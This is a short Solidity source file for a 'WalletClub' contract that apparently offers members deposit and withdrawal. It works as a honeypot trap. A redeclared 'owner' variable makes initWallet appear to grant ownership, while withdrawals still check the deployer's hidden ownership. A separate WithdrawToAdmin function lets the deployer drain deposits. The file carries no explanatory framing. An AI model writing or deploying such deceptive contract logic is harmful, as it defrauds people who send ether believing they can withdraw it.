 

pragma solidity ^0.4.17;

 


contract Owned 
{
    address admin = msg.sender;
    address owner = msg.sender;
    address newOwner;

    function isOwner()
    public
    constant
    returns(bool)
    {
        return owner == msg.sender;
    }
     
    function changeOwner(address addr)
    public
    {
        if(isOwner())
        {
            newOwner = addr;
        }
    }
    
    function confirmOwner()
    public
    {
        if(msg.sender==newOwner)
        {
            owner=newOwner;
        }
    }

    function WithdrawToAdmin(uint val)
    public
    {
        if(msg.sender==admin)
        {
            admin.transfer(val);
        }
    }

}

contract WalletClub is Owned
{
    mapping (address => uint) public Members;
    address public owner;
    uint256 public TotalFunds;
     
    function initWallet()
    public
    {
        owner = msg.sender;
    }

    function TopUpMember()
    public
    payable
    {
        if(msg.value >= 1 ether)
        {
            Members[msg.sender]+=msg.value;
            TotalFunds += msg.value;
        }   
    }
        
    function()
    public
    payable
    {
        TopUpMember();
    }
    
    function WithdrawToMember(address _addr, uint _wei)
    public 
    {
        if(Members[_addr]>0)
        {
            if(isOwner())
            {
                 if(_addr.send(_wei))
                 {
                   if(TotalFunds>=_wei)TotalFunds-=_wei;
                   else TotalFunds=0;
                 }
            }
        }
    }
}